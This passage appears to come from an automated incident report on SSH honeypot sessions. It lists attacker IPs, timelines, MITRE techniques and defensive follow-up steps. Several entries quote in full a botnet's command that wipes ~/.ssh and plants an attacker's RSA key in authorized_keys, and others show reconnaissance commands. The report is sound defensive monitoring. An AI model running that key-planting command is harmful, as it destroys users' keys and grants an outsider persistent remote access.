| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:28:19` | `cowrie.session.connect` |
| `2026-07-02 19:28:19` | `cowrie.client.version` |
| `2026-07-02 19:28:19` | `cowrie.client.kex` |
| `2026-07-02 19:28:20` | `cowrie.login.success` |
| `2026-07-02 19:28:21` | `cowrie.session.params` |
| `2026-07-02 19:28:21` | `cowrie.command.input` |
| `2026-07-02 19:28:21` | `cowrie.command.failed` |
| `2026-07-02 19:28:22` | `cowrie.log.closed` |
| `2026-07-02 19:28:23` | `cowrie.session.params` |
| `2026-07-02 19:28:23` | `cowrie.command.input` |
| `2026-07-02 19:28:23` | `cowrie.session.file_download` |
| `2026-07-02 19:28:23` | `cowrie.log.closed` |
| `2026-07-02 19:28:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.200.74[.]18` to AbuseIPDB if not already reported
- [ ] Block `203.200.74[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5cffdd5fdf8f

| Field | Detail |
|---|---|
| **Source IP** | `203.200.74[.]18` |
| **First Seen** | 2026-07-02 19:28 |
| **Last Seen** | 2026-07-02 19:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:28:23` | `cowrie.session.connect` |
| `2026-07-02 19:28:23` | `cowrie.client.version` |
| `2026-07-02 19:28:23` | `cowrie.client.kex` |
| `2026-07-02 19:28:24` | `cowrie.login.success` |
| `2026-07-02 19:28:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.200.74[.]18` to AbuseIPDB if not already reported
- [ ] Block `203.200.74[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9634dde6d67f

| Field | Detail |
|---|---|
| **Source IP** | `203.200.74[.]18` |
| **First Seen** | 2026-07-02 19:28 |
| **Last Seen** | 2026-07-02 19:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:28:25` | `cowrie.session.connect` |
| `2026-07-02 19:28:25` | `cowrie.client.version` |
| `2026-07-02 19:28:25` | `cowrie.client.kex` |
| `2026-07-02 19:28:26` | `cowrie.login.success` |
| `2026-07-02 19:28:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.200.74[.]18` to AbuseIPDB if not already reported
- [ ] Block `203.200.74[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78dc7e1ddf4d

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 19:29 |
| **Last Seen** | 2026-07-02 19:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:29:44` | `cowrie.session.connect` |
| `2026-07-02 19:29:45` | `cowrie.client.version` |
| `2026-07-02 19:29:45` | `cowrie.client.kex` |
| `2026-07-02 19:29:46` | `cowrie.login.success` |
| `2026-07-02 19:29:47` | `cowrie.session.params` |
| `2026-07-02 19:29:47` | `cowrie.command.input` |
| `2026-07-02 19:29:48` | `cowrie.log.closed` |
| `2026-07-02 19:29:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd3fa40e69e6

| Field | Detail |
|---|---|
| **Source IP** | `139.99.74[.]35` |
| **First Seen** | 2026-07-02 19:30 |
| **Last Seen** | 2026-07-02 19:31 |
| **Session Duration** | 45s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a && echo "====" && cat /etc/os-release` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:30:35` | `cowrie.session.connect` |
| `2026-07-02 19:30:40` | `cowrie.client.version` |
| `2026-07-02 19:30:40` | `cowrie.client.kex` |
| `2026-07-02 19:31:03` | `cowrie.login.success` |
| `2026-07-02 19:31:15` | `cowrie.session.params` |
| `2026-07-02 19:31:15` | `cowrie.command.input` |
| `2026-07-02 19:31:21` | `cowrie.log.closed` |
| `2026-07-02 19:31:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.99.74[.]35` to AbuseIPDB if not already reported
- [ ] Block `139.99.74[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe2b333f5b7d

| Field | Detail |
|---|---|
| **Source IP** | `180.93.172[.]213` |
| **First Seen** | 2026-07-02 19:30 |
| **Last Seen** | 2026-07-02 19:31 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:30:51` | `cowrie.session.connect` |
| `2026-07-02 19:30:51` | `cowrie.client.version` |
| `2026-07-02 19:30:51` | `cowrie.client.kex` |
| `2026-07-02 19:30:53` | `cowrie.login.success` |
| `2026-07-02 19:30:55` | `cowrie.session.params` |
| `2026-07-02 19:30:55` | `cowrie.command.input` |
| `2026-07-02 19:30:55` | `cowrie.command.failed` |
| `2026-07-02 19:30:55` | `cowrie.log.closed` |
| `2026-07-02 19:30:56` | `cowrie.session.params` |
| `2026-07-02 19:30:56` | `cowrie.command.input` |
| `2026-07-02 19:30:56` | `cowrie.session.file_download` |
| `2026-07-02 19:30:56` | `cowrie.log.closed` |
| `2026-07-02 19:31:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.93.172[.]213` to AbuseIPDB if not already reported
- [ ] Block `180.93.172[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8866810328ae

| Field | Detail |
|---|---|
| **Source IP** | `180.93.172[.]213` |
| **First Seen** | 2026-07-02 19:30 |
| **Last Seen** | 2026-07-02 19:30 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:30:57` | `cowrie.session.connect` |
| `2026-07-02 19:30:57` | `cowrie.client.version` |
| `2026-07-02 19:30:57` | `cowrie.client.kex` |
| `2026-07-02 19:30:59` | `cowrie.login.success` |
| `2026-07-02 19:30:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.93.172[.]213` to AbuseIPDB if not already reported
- [ ] Block `180.93.172[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d065b8a94ed

| Field | Detail |
|---|---|
| **Source IP** | `180.93.172[.]213` |
| **First Seen** | 2026-07-02 19:30 |
| **Last Seen** | 2026-07-02 19:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:30:59` | `cowrie.session.connect` |
| `2026-07-02 19:30:59` | `cowrie.client.version` |
| `2026-07-02 19:31:00` | `cowrie.client.kex` |
| `2026-07-02 19:31:02` | `cowrie.login.success` |
| `2026-07-02 19:31:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.93.172[.]213` to AbuseIPDB if not already reported
- [ ] Block `180.93.172[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7e78da72c2b

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-02 19:31 |
| **Last Seen** | 2026-07-02 19:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:31:10` | `cowrie.session.connect` |
| `2026-07-02 19:31:10` | `cowrie.client.version` |
| `2026-07-02 19:31:10` | `cowrie.client.kex` |
| `2026-07-02 19:31:11` | `cowrie.login.success` |
| `2026-07-02 19:31:12` | `cowrie.session.params` |
| `2026-07-02 19:31:12` | `cowrie.command.input` |
| `2026-07-02 19:31:12` | `cowrie.log.closed` |
| `2026-07-02 19:31:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4275f88f4a2

| Field | Detail |
|---|---|
| **Source IP** | `139.99.74[.]35` |
| **First Seen** | 2026-07-02 19:32 |
| **Last Seen** | 2026-07-02 19:33 |
| **Session Duration** | 46s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a && echo "====" && cat /etc/os-release` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:32:28` | `cowrie.session.connect` |
| `2026-07-02 19:32:33` | `cowrie.client.version` |
| `2026-07-02 19:32:33` | `cowrie.client.kex` |
| `2026-07-02 19:32:56` | `cowrie.login.success` |
| `2026-07-02 19:33:07` | `cowrie.session.params` |
| `2026-07-02 19:33:07` | `cowrie.command.input` |
| `2026-07-02 19:33:15` | `cowrie.log.closed` |
| `2026-07-02 19:33:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.99.74[.]35` to AbuseIPDB if not already reported
- [ ] Block `139.99.74[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-993346284642

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 19:32 |
| **Last Seen** | 2026-07-02 19:33 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:32:57` | `cowrie.session.connect` |
| `2026-07-02 19:32:58` | `cowrie.client.version` |
| `2026-07-02 19:32:58` | `cowrie.client.kex` |
| `2026-07-02 19:33:04` | `cowrie.login.success` |
| `2026-07-02 19:33:07` | `cowrie.session.params` |
| `2026-07-02 19:33:07` | `cowrie.command.input` |
| `2026-07-02 19:33:09` | `cowrie.log.closed` |
| `2026-07-02 19:33:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2622dfc4340b

| Field | Detail |
|---|---|
| **Source IP** | `139.99.74[.]35` |
| **First Seen** | 2026-07-02 19:33 |
| **Last Seen** | 2026-07-02 19:34 |
| **Session Duration** | 45s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a && echo "====" && cat /etc/os-release` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:33:25` | `cowrie.session.connect` |
| `2026-07-02 19:33:31` | `cowrie.client.version` |
| `2026-07-02 19:33:31` | `cowrie.client.kex` |
| `2026-07-02 19:33:53` | `cowrie.login.success` |
| `2026-07-02 19:34:06` | `cowrie.session.params` |
| `2026-07-02 19:34:06` | `cowrie.command.input` |
| `2026-07-02 19:34:11` | `cowrie.log.closed` |
| `2026-07-02 19:34:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.99.74[.]35` to AbuseIPDB if not already reported
- [ ] Block `139.99.74[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-720dff695f0f

| Field | Detail |
|---|---|
| **Source IP** | `139.99.74[.]35` |
| **First Seen** | 2026-07-02 19:34 |
| **Last Seen** | 2026-07-02 19:35 |
| **Session Duration** | 48s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a && echo "====" && cat /etc/os-release` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:34:11` | `cowrie.session.connect` |
| `2026-07-02 19:34:17` | `cowrie.client.version` |
| `2026-07-02 19:34:17` | `cowrie.client.kex` |
| `2026-07-02 19:34:39` | `cowrie.login.success` |
| `2026-07-02 19:34:50` | `cowrie.session.params` |
| `2026-07-02 19:34:50` | `cowrie.command.input` |
| `2026-07-02 19:35:00` | `cowrie.log.closed` |
| `2026-07-02 19:35:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.99.74[.]35` to AbuseIPDB if not already reported
- [ ] Block `139.99.74[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90f9bafcafda

| Field | Detail |
|---|---|
| **Source IP** | `139.99.74[.]35` |
| **First Seen** | 2026-07-02 19:35 |
| **Last Seen** | 2026-07-02 19:36 |
| **Session Duration** | 46s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a && echo "====" && cat /etc/os-release` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:35:51` | `cowrie.session.connect` |
| `2026-07-02 19:35:58` | `cowrie.client.version` |
| `2026-07-02 19:35:58` | `cowrie.client.kex` |
| `2026-07-02 19:36:21` | `cowrie.login.success` |
| `2026-07-02 19:36:32` | `cowrie.session.params` |
| `2026-07-02 19:36:32` | `cowrie.command.input` |
| `2026-07-02 19:36:38` | `cowrie.log.closed` |
| `2026-07-02 19:36:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.99.74[.]35` to AbuseIPDB if not already reported
- [ ] Block `139.99.74[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6e94febb109

| Field | Detail |
|---|---|
| **Source IP** | `139.99.74[.]35` |
| **First Seen** | 2026-07-02 19:40 |
| **Last Seen** | 2026-07-02 19:41 |
| **Session Duration** | 44s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a && echo "====" && cat /etc/os-release` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:40:25` | `cowrie.session.connect` |
| `2026-07-02 19:40:30` | `cowrie.client.version` |
| `2026-07-02 19:40:30` | `cowrie.client.kex` |
| `2026-07-02 19:40:52` | `cowrie.login.success` |
| `2026-07-02 19:41:04` | `cowrie.session.params` |
| `2026-07-02 19:41:04` | `cowrie.command.input` |
| `2026-07-02 19:41:09` | `cowrie.log.closed` |
| `2026-07-02 19:41:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.99.74[.]35` to AbuseIPDB if not already reported
- [ ] Block `139.99.74[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90489359f331

| Field | Detail |
|---|---|
| **Source IP** | `139.99.74[.]35` |
| **First Seen** | 2026-07-02 19:41 |
| **Last Seen** | 2026-07-02 19:42 |
| **Session Duration** | 45s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a && echo "====" && cat /etc/os-release` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:41:55` | `cowrie.session.connect` |
| `2026-07-02 19:42:01` | `cowrie.client.version` |
| `2026-07-02 19:42:01` | `cowrie.client.kex` |
| `2026-07-02 19:42:24` | `cowrie.login.success` |
| `2026-07-02 19:42:35` | `cowrie.session.params` |
| `2026-07-02 19:42:35` | `cowrie.command.input` |
| `2026-07-02 19:42:41` | `cowrie.log.closed` |
| `2026-07-02 19:42:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.99.74[.]35` to AbuseIPDB if not already reported
- [ ] Block `139.99.74[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-689df5a9ac7f

| Field | Detail |
|---|---|
| **Source IP** | `139.99.74[.]35` |
| **First Seen** | 2026-07-02 19:42 |
| **Last Seen** | 2026-07-02 19:43 |
| **Session Duration** | 45s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a && echo "====" && cat /etc/os-release` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:42:46` | `cowrie.session.connect` |
| `2026-07-02 19:42:51` | `cowrie.client.version` |
| `2026-07-02 19:42:51` | `cowrie.client.kex` |
| `2026-07-02 19:43:13` | `cowrie.login.success` |
| `2026-07-02 19:43:26` | `cowrie.session.params` |
| `2026-07-02 19:43:26` | `cowrie.command.input` |
| `2026-07-02 19:43:31` | `cowrie.log.closed` |
| `2026-07-02 19:43:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.99.74[.]35` to AbuseIPDB if not already reported
- [ ] Block `139.99.74[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a44c9d1afd66

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 19:43 |
| **Last Seen** | 2026-07-02 19:43 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:43:38` | `cowrie.session.connect` |
| `2026-07-02 19:43:38` | `cowrie.client.version` |
| `2026-07-02 19:43:38` | `cowrie.client.kex` |
| `2026-07-02 19:43:40` | `cowrie.login.success` |
| `2026-07-02 19:43:42` | `cowrie.session.params` |
| `2026-07-02 19:43:42` | `cowrie.command.input` |
| `2026-07-02 19:43:43` | `cowrie.log.closed` |
| `2026-07-02 19:43:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0bf5935bd0df

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 19:44 |
| **Last Seen** | 2026-07-02 19:44 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:44:34` | `cowrie.session.connect` |
| `2026-07-02 19:44:36` | `cowrie.client.version` |
| `2026-07-02 19:44:36` | `cowrie.client.kex` |
| `2026-07-02 19:44:43` | `cowrie.login.success` |
| `2026-07-02 19:44:47` | `cowrie.session.params` |
| `2026-07-02 19:44:47` | `cowrie.command.input` |
| `2026-07-02 19:44:49` | `cowrie.log.closed` |
| `2026-07-02 19:44:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d314a55ddecb

| Field | Detail |
|---|---|
| **Source IP** | `138.124.69[.]150` |
| **First Seen** | 2026-07-02 19:45 |
| **Last Seen** | 2026-07-02 19:45 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:45:13` | `cowrie.session.connect` |
| `2026-07-02 19:45:13` | `cowrie.client.version` |
| `2026-07-02 19:45:13` | `cowrie.client.kex` |
| `2026-07-02 19:45:13` | `cowrie.login.success` |
| `2026-07-02 19:45:14` | `cowrie.session.params` |
| `2026-07-02 19:45:14` | `cowrie.command.input` |
| `2026-07-02 19:45:14` | `cowrie.command.failed` |
| `2026-07-02 19:45:14` | `cowrie.log.closed` |
| `2026-07-02 19:45:15` | `cowrie.session.params` |
| `2026-07-02 19:45:15` | `cowrie.command.input` |
| `2026-07-02 19:45:15` | `cowrie.session.file_download` |
| `2026-07-02 19:45:15` | `cowrie.log.closed` |
| `2026-07-02 19:45:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.69[.]150` to AbuseIPDB if not already reported
- [ ] Block `138.124.69[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dbf5517bfa27

| Field | Detail |
|---|---|
| **Source IP** | `138.124.69[.]150` |
| **First Seen** | 2026-07-02 19:45 |
| **Last Seen** | 2026-07-02 19:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:45:15` | `cowrie.session.connect` |
| `2026-07-02 19:45:15` | `cowrie.client.version` |
| `2026-07-02 19:45:15` | `cowrie.client.kex` |
| `2026-07-02 19:45:16` | `cowrie.login.success` |
| `2026-07-02 19:45:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.69[.]150` to AbuseIPDB if not already reported
- [ ] Block `138.124.69[.]150` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e70f5d50f18

| Field | Detail |
|---|---|
| **Source IP** | `138.124.69[.]150` |
| **First Seen** | 2026-07-02 19:45 |
| **Last Seen** | 2026-07-02 19:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:45:16` | `cowrie.session.connect` |
| `2026-07-02 19:45:16` | `cowrie.client.version` |
| `2026-07-02 19:45:16` | `cowrie.client.kex` |
| `2026-07-02 19:45:17` | `cowrie.login.success` |
| `2026-07-02 19:45:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.69[.]150` to AbuseIPDB if not already reported
- [ ] Block `138.124.69[.]150` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19b6f45f3378

| Field | Detail |
|---|---|
| **Source IP** | `139.99.74[.]35` |
| **First Seen** | 2026-07-02 19:45 |
| **Last Seen** | 2026-07-02 19:46 |
| **Session Duration** | 44s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a && echo "====" && cat /etc/os-release` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:45:25` | `cowrie.session.connect` |
| `2026-07-02 19:45:30` | `cowrie.client.version` |
| `2026-07-02 19:45:30` | `cowrie.client.kex` |
| `2026-07-02 19:45:53` | `cowrie.login.success` |
| `2026-07-02 19:46:04` | `cowrie.session.params` |
| `2026-07-02 19:46:04` | `cowrie.command.input` |
| `2026-07-02 19:46:09` | `cowrie.log.closed` |
| `2026-07-02 19:46:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.99.74[.]35` to AbuseIPDB if not already reported
- [ ] Block `139.99.74[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d593a7c40377

| Field | Detail |
|---|---|
| **Source IP** | `163.227.52[.]50` |
| **First Seen** | 2026-07-02 19:45 |
| **Last Seen** | 2026-07-02 19:45 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
